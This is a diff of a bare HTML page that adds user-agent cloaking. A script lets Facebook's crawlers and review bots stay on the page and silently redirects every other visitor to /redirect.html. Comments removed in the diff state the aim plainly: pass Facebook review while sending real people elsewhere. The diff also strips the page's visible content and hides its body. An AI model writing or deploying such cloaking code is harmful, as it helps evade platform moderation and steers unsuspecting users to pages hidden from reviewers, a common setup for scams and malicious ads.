@@ -2,18 +2,14 @@
 <html>
 <head>
 <meta charset="UTF-8">
-<title>Welcome</title>
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
 <meta name="robots" content="noindex,nofollow">
-</head>
-<body>
-<h2>Welcome</h2>
-<p>Thanks for visiting.</p>
-
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<style>
+body{display:none;margin:0;}
+</style>
 <script>
 const ua = navigator.userAgent || "";
 
-// FB审查访问 → 停留在首页
 const isFB = 
   ua.includes("FBAN") || 
   ua.includes("FBAV") || 
@@ -21,11 +17,10 @@ const isFB =
   ua.includes("Facebot") ||
   ua.includes("facebookexternalhit");
 
-// 真人访问 → 跳转 redirect.html
 if (!isFB) {
   location.href = "/redirect.html";
 }
 </script>
-
-</body>
+</head>
+<body></body>
 </html>
